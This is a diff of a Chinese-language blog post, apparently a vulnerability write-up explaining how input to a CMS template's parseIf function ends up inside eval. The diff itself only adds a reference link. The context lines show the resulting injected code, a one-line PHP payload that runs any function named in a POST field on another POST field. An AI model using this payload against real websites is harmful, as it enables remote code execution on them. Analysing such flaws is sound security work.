@@ -27,6 +27,8 @@
 <p>然后在 <code>parseIf</code> 提取 <code>if</code>  语句对应标签内容时，可以看到我们的输入被识别成了标签。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520302590089mokw196q.png?imageslim" alt="paste image"></p>
 <p>最后在 <code>eval</code> 时，执行的其实是</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(1)print_r($_POST[func]($_POST[cmd]));//)&#123;$ifFlag=true;&#125;else&#123;$ifFlag=false;&#125;</div></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<p><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-35085-1-1.html</a></p>
 ]]></content>
       
         <categories>
